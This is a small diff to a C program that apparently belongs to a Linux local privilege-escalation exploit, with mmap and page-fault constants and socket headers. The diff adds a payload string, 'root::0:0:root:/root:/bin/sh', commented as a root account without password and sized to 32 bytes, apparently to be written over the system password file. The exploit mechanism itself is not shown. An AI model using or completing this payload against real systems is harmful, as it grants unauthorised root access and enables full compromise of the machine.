@@ -1,4 +1,5 @@
 #define _GNU_SOURCE
+#include <assert.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <sys/socket.h>
@@ -15,6 +16,10 @@
 #define MMAP_SIZE 4 * PAGE
 #define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
 // (END constants)
+
+// root account without password
+static char g_root[] = "root::0:0:root:/root:/bin/sh\n\n\n";
+static_assert(sizeof(g_root) == 0x20);
 
 // globals
 // (END globals)
